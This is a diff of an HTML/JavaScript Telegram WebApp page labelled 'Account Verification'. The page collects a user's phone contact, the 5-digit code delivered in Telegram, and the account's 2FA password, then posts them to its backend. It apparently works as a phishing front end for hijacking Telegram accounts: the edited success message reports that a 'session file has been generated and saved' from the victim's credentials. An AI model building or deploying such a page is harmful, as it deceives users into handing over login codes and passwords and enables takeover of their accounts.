@@ -37,21 +37,7 @@
       display: block;
     }
     
-    .session-info {
-      background: #e3f2fd;
-      padding: 10px 15px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-      font-size: 14px;
-      border-left: 4px solid #2196F3;
-    }
-    
-    .session-info .timer {
-      color: #d32f2f;
-      font-weight: bold;
-    }
-    
-    .user-box {
+    .info-box {
       border: 2px solid #4CAF50;
       padding: 15px;
       border-radius: 10px;
@@ -82,7 +68,7 @@
       margin: 10px 0;
     }
     
-    button:hover:not(:disabled) {
+    button:hover {
       transform: translateY(-2px);
       box-shadow: 0 5px 15px rgba(76,175,80,0.3);
     }
@@ -95,14 +81,6 @@
     
     button.secondary {
       background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
-    }
-    
-    button.warning {
-      background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
-    }
-    
-    button.danger {
-      background: linear-gradient(135deg, #f44336 0%, #d32f2f 100%);
     }
     
     .spinner {
@@ -120,16 +98,25 @@
     }
     
     .instructions {
-      background: #f8f9fa;
+      background: #e3f2fd;
       padding: 15px;
       border-radius: 10px;
       margin: 20px 0;
-      border: 1px solid #e9ecef;
+      border-left: 4px solid #2196F3;
     }
     
     .instructions h3 {
       margin-top: 0;
       color: #1976D2;
+    }
+    
+    .instructions ol {
+      margin: 10px 0 0 20px;
+      color: #555;
+    }
+    
+    .instructions li {
+      margin: 8px 0;
     }
     
     .alert {
@@ -151,14 +138,12 @@
       border-left: 4px solid #f44336;
     }
     
-    .alert.warning {
-      background: #fff3e0;
-      color: #f57c00;
-      border-left: 4px solid #FF9800;
-    }
-    
     .alert.show {
       display: block;
+    }
+    
+    .hidden {
+      display: none;
     }
     
     .otp-input {
@@ -171,6 +156,11 @@
       border-radius: 10px;
       margin: 20px 0;
       font-weight: bold;
+    }
+    
+    .otp-input:focus {
+      outline: none;
+      border-color: #4CAF50;
     }
     
     .password-input {
@@ -193,18 +183,49 @@
       margin-bottom: 20px;
     }
     
-    .attempts-counter {
-      text-align: center;
-      color: #666;
-      font-size: 14px;
-      margin: 10px 0;
+    .step-indicator {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0 40px;
+      position: relative;
     }
     
-    .resend-info {
+    .step {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      z-index: 2;
+    }
+    
+    .step.active {
+      background: #4CAF50;
+    }
+    
+    .step.completed {
+      background: #4CAF50;
+    }
+    
+    .step-line {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      right: 15px;
+      height: 2px;
+      background: #ddd;
+      z-index: 1;
+    }
+    
+    .step-label {
       text-align: center;
+      margin-top: 5px;
+      font-size: 12px;
       color: #666;
-      font-size: 14px;
-      margin: 15px 0;
     }
   </style>
 </head>
@@ -212,37 +233,53 @@
   <div class="container">
     <h2>🔐 Account Verification</h2>
     
-    <!-- Session Info -->
-    <div id="session-info" class="session-info">
-      Session ID: <span id="session-id-display">Loading...</span>
-      • Expires in: <span id="session-timer" class="timer">5:00</span>
+    <!-- Step Indicator -->
+    <div class="step-indicator">
+      <div class="step" id="step1">1</div>
+      <div class="step" id="step2">2</div>
+      <div class="step" id="step3">3</div>
+      <div class="step-line"></div>
+    </div>
+    <div style="display: flex; justify-content: space-between; margin-top: -10px;">
+      <div class="step-label">Share Contact</div>
+      <div class="step-label">Enter OTP</div>
+      <div class="step-label">Complete</div>
     </div>
     
-    <!-- User Info Box -->
-    <div id="user-box" class="user-box">
-      <div class="info-line">📱 Phone: <span id="user-phone">Not shared yet</span></div>
-      <div class="info-line">📊 Status: <span id="user-status">Waiting for contact...</span></div>
+    <!-- Session Info -->
+    <div class="info-box">
+      <div class="info-line">🔑 Session ID: <span id="session-id">Loading...</span></div>
+      <div class="info-line">👤 Name: <span id="user-name">Loading...</span></div>
+      <div class="info-line">💬 Username: <span id="user-username">Loading...</span></div>
+      <div class="info-line">📞 Phone: <span id="user-phone">Not shared yet</span></div>
     </div>
     
     <!-- Alerts -->
     <div class="alert error" id="error-alert"></div>
     <div class="alert success" id="success-alert"></div>
-    <div class="alert warning" id="warning-alert"></div>
     
     <!-- Section 1: Contact Sharing -->
     <div id="section-contact" class="section active">
       <div class="instructions">
         <h3>📋 Step 1: Share Your Contact</h3>
-        <p>Click the button below to share your phone number with the bot.</p>
-        <p>Your contact will be auto-deleted immediately for privacy.</p>
-        <p style="color: #666; font-size: 14px; margin-top: 10px;">
-          ⏰ <b>Note:</b> Session expires in 5 minutes
+        <ol>
+          <li>Click "Share Contact" button below</li>
+          <li>Select your contact from Telegram</li>
+          <li>5-digit OTP will appear in bot chat</li>
+          <li>Return here for next step</li>
+        </ol>
+        <p style="margin-top: 10px; color: #666; font-size: 14px;">
+          🔒 <b>Privacy:</b> Your contact will be auto-deleted immediately
         </p>
       </div>
       
       <button id="share-btn">
-        📱 Share Phone Number
+        📱 Share Contact
       </button>
+      
+      <p style="text-align: center; color: #666; margin-top: 20px;">
+        <small>Share your contact with <span id="bot-name">@Bot</span> to receive OTP</small>
+      </p>
     </div>
     
     <!-- Section 2: OTP Entry -->
@@ -264,20 +301,8 @@
              pattern="\d{5}"
              oninput="this.value = this.value.replace(/\D/g, '').slice(0,5)">
       
-      <div class="attempts-counter">
-        Attempts: <span id="attempts-count">0</span>/3
-      </div>
-      
       <button onclick="verifyOTP()" id="verify-otp-btn">
         ✅ Verify OTP
-      </button>
-      
-      <div class="resend-info">
-        Didn't receive OTP or code expired?
-      </div>
-      
-      <button onclick="resendOTP()" id="resend-otp-btn" class="warning">
-        🔄 Resend OTP
       </button>
       
       <button onclick="showSection('contact')" class="secondary">
@@ -313,25 +338,12 @@
         <div class="success-icon">✅</div>
         <h2>Verification Successful!</h2>
         <p>Your account has been verified successfully.</p>
-        <p>Session data has been securely processed.</p>
+        <p>Session file has been generated and saved.</p>
         
         <button onclick="closeWebApp()" style="margin-top: 30px;">
           🏁 Close WebApp
         </button>
       </div>
-    </div>
-    
-    <!-- Section 5: Expired -->
-    <div id="section-expired" class="section">
-      <div class="instructions" style="background: #ffebee; border-color: #f44336;">
-        <h3 style="color: #d32f2f;">⏰ Session Expired</h3>
-        <p>Your verification session has expired (5 minutes timeout).</p>
-        <p>Please return to the bot and use <b>/start</b> command to begin a new session.</p>
-      </div>
-      
-      <button onclick="closeWebApp()" class="danger">
-        ❌ Close & Restart
-      </button>
     </div>
   </div>
 
@@ -339,78 +351,57 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
     
-    let sessionId = new URLSearchParams(window.location.search).get('session_id');
-    let timerInterval = null;
-    let checkInterval = null;
+    // Get session ID from URL or generate
+    const urlParams = new URLSearchParams(window.location.search);
+    let sessionId = urlParams.get('session_id');
     
-    // Display session ID
-    if (sessionId) {
-      document.getElementById('session-id-display').textContent = sessionId.substring(0, 8) + '...';
+    if (!sessionId) {
+      // Generate session ID for this WebApp instance
+      sessionId = 'webapp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+      window.history.replaceState({}, '', `?session_id=${sessionId}`);
     }
     
-    // Start session timer
-    function startSessionTimer(seconds) {
-      if (timerInterval) clearInterval(timerInterval);
-      
-      let timeLeft = seconds;
-      
-      function updateTimer() {
-        const minutes = Math.floor(timeLeft / 60);
-        const secs = timeLeft % 60;
-        document.getElementById('session-timer').textContent = 
-          `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
-        
-        if (timeLeft <= 0) {
-          clearInterval(timerInterval);
-          showSection('expired');
-        }
-        timeLeft--;
-      }
-      
-      updateTimer();
-      timerInterval = setInterval(updateTimer, 1000);
+    let userPhone = null;
+    let currentStage = 'contact';
+    
+    // Initialize
+    document.getElementById('session-id').textContent = sessionId.substring(0, 12) + '...';
+    
+    const user = tg.initDataUnsafe?.user;
+    if (user) {
+      document.getElementById('user-name').textContent = user.first_name || 'N/A';
+      document.getElementById('user-username').textContent = '@' + (user.username || 'N/A');
     }
     
     // Load session data
     async function loadSessionData() {
-      if (!sessionId) return;
-      
       try {
-        const response = await fetch(`/api/session/${sessionId}`);
-        const data = await response.json();
+        const res = await fetch(`/api/session/${sessionId}`);
+        const data = await res.json();
         
         if (data.success) {
           const session = data.session;
           
-          // Update timer
-          startSessionTimer(session.time_remaining);
-          
-          // Update UI based on session stage
           if (session.phone) {
-            document.getElementById('user-phone').textContent = session.phone;
+            userPhone = session.phone;
+            document.getElementById('user-phone').textContent = userPhone;
           }
           
-          document.getElementById('user-status').textContent = 
-            session.stage.replace('_', ' ').toUpperCase();
-          
-          // Show appropriate section
-          if (session.expired) {
-            showSection('expired');
-          } else if (session.verified) {
-            showSection('success');
-          } else if (session.stage === 'needs_2fa' || session.requires_2fa) {
-            showSection('2fa');
-          } else if (session.stage === 'otp_sent' || session.phone) {
+          // Update UI based on stage
+          if (session.stage === 'contact_shared') {
             showSection('otp');
-            document.getElementById('attempts-count').textContent = session.otp_attempts;
-          } else {
-            showSection('contact');
+            updateSteps(2);
+          } else if (session.stage === 'needs_2fa') {
+            showSection('2fa');
+            updateSteps(3);
+          } else if (session.stage === 'verified') {
+            showSection('success');
+            updateSteps(4);
           }
         } else {
-          if (data.expired) {
-            showSection('expired');
-          } else {
-            showAlert(data.error || 'Session error', 'error');
+          // Session expired, create new one
+          if (data.stage === 'expired') {
+            showAlert('Session expired. Please refresh the page.', 'error');
           }
         }
       } catch (error) {
@@ -445,84 +436,47 @@
               const data = await response.json();
               
               if (data.success) {
-                showAlert('✅ Contact shared! Sending OTP...', 'success');
+                showAlert('✅ Contact shared! Check bot chat for OTP.', 'success');
+                userPhone = phone;
+                document.getElementById('user-phone').textContent = phone;
                 
-                // Send OTP
-                await sendOTP();
-                
-                // Update UI
-                setTimeout(loadSessionData, 1000);
-              } else if (data.expired) {
-                showSection('expired');
+                // Move to OTP section
+                setTimeout(() => {
+                  showSection('otp');
+                  updateSteps(2);
+                }, 1500);
               } else {
                 showAlert('❌ ' + (data.error || 'Failed to share contact'), 'error');
-                btn.innerHTML = '📱 Share Phone Number';
+                btn.innerHTML = '📱 Share Contact';
                 btn.disabled = false;
               }
             } catch (error) {
               showAlert('❌ Network error', 'error');
-              btn.innerHTML = '📱 Share Phone Number';
+              btn.innerHTML = '📱 Share Contact';
               btn.disabled = false;
             }
           } else {
             showAlert('❌ Could not get phone number', 'error');
-            btn.innerHTML = '📱 Share Phone Number';
+            btn.innerHTML = '📱 Share Contact';
             btn.disabled = false;
           }
         } else {
           showAlert('❌ Contact sharing cancelled', 'error');
-          btn.innerHTML = '📱 Share Phone Number';
+          btn.innerHTML = '📱 Share Contact';
           btn.disabled = false;
         }
       });
     };
     
-    // Send OTP
-    async function sendOTP() {
-      try {
-        const btn = document.getElementById('resend-otp-btn');
-        if (btn) {
-          btn.innerHTML = '<div class="spinner"></div> Sending...';
-          btn.disabled = true;
-        }
-        
-        const response = await fetch('/api/send-otp', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ session_id: sessionId })
-        });
-        
-        const data = await response.json();
-        
-        if (data.success) {
-          showAlert('✅ OTP sent! Check your Telegram chat.', 'success');
-          showSection('otp');
-        } else if (data.expired) {
-          showSection('expired');
-        } else {
-          showAlert('❌ ' + (data.error || 'Failed to send OTP'), 'error');
-        }
-        
-        if (btn) {
-          setTimeout(() => {
-            btn.innerHTML = '🔄 Resend OTP';
-            btn.disabled = false;
-          }, 3000);
-        }
-      } catch (error) {
-        showAlert('❌ Network error', 'error');
-      }
-    }
-    
-    // Resend OTP
-    async function resendOTP() {
-      await sendOTP();
-    }
-    
     // Verify OTP
     async function verifyOTP() {
       const otp = document.getElementById('otp-input').value.trim();
       const btn = document.getElementById('verify-otp-btn');
+      
+      if (!userPhone) {
+        showAlert('Please share your contact first', 'error');
+        return;
+      }
       
       // Validate
       if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
@@ -540,6 +494,7 @@
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
             session_id: sessionId,
+            phone: userPhone,
             otp: otp
           })
         });
@@ -550,25 +505,19 @@
           if (data.requires_2fa) {
             showAlert('🔐 2FA password required', 'success');
             showSection('2fa');
+            updateSteps(3);
           } else {
             showAlert('✅ Verification successful!', 'success');
             showSection('success');
+            updateSteps(4);
           }
-        } else if (data.expired) {
-          showSection('expired');
         } else {
           showAlert('❌ ' + (data.error || 'Invalid OTP'), 'error');
-          document.getElementById('attempts-count').textContent = data.attempts || 0;
-          
-          if (data.attempts >= 3) {
-            showAlert('⚠️ Too many attempts. Please resend OTP.', 'warning');
-          }
+          btn.innerHTML = '✅ Verify OTP';
+          btn.disabled = false;
         }
-        
-        btn.innerHTML = '✅ Verify OTP';
-        btn.disabled = false;
       } catch (error) {
-        showAlert('❌ Network error', 'error');
+        showAlert('❌ Network error. Please try again.', 'error');
         btn.innerHTML = '✅ Verify OTP';
         btn.disabled = false;
       }
@@ -578,6 +527,11 @@
     async function verify2FA() {
       const password = document.getElementById('password-input').value.trim();
       const btn = document.getElementById('verify-2fa-btn');
+      
+      if (!userPhone) {
+        showAlert('Please complete previous steps first', 'error');
+        return;
+      }
       
       if (!password) {
         showAlert('Please enter 2FA password', 'error');
@@ -593,6 +547,7 @@
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
             session_id: sessionId,
+            phone: userPhone,
             password: password
           })
         });
@@ -602,8 +557,7 @@
         if (data.success) {
           showAlert('✅ 2FA verified successfully!', 'success');
           showSection('success');
-        } else if (data.expired) {
-          showSection('expired');
+          updateSteps(4);
         } else {
           showAlert('❌ ' + (data.error || 'Invalid password'), 'error');
           btn.innerHTML = '🔐 Verify 2FA';
@@ -623,6 +577,7 @@
       
       // Show selected section
       document.getElementById(`section-${sectionName}`).classList.add('active');
+      currentStage = sectionName;
       
       // Auto-focus inputs
       if (sectionName === 'otp') {
@@ -632,10 +587,24 @@
       }
     }
     
+    function updateSteps(stepNumber) {
+      // Reset all steps
+      for (let i = 1; i <= 3; i++) {
+        const step = document.getElementById(`step${i}`);
+        step.classList.remove('active', 'completed');
+        
+        if (i < stepNumber) {
+          step.classList.add('completed');
+        } else if (i === stepNumber) {
+          step.classList.add('active');
+        }
+      }
+    }
+    
     function showAlert(message, type) {
       const alert = document.getElementById(`${type}-alert`);
       alert.textContent = message;
-      alert.className = `alert ${type} show`;
+      alert.classList.add('show');
       setTimeout(() => alert.classList.remove('show'), 3000);
     }
     
@@ -644,14 +613,10 @@
     }
     
     // Initial load
-    if (sessionId) {
-      loadSessionData();
-      
-      // Check session status every 10 seconds
-      checkInterval = setInterval(loadSessionData, 10000);
-    } else {
-      showAlert('Invalid session ID', 'error');
-    }
+    loadSessionData();
+    
+    // Auto-refresh session data
+    setInterval(loadSessionData, 2000);
     
     // Enter key support
     document.getElementById('otp-input')?.addEventListener('keypress', function(e) {
@@ -663,4 +628,4 @@
     });
   </script>
 </body>
-        </html>
+</html>
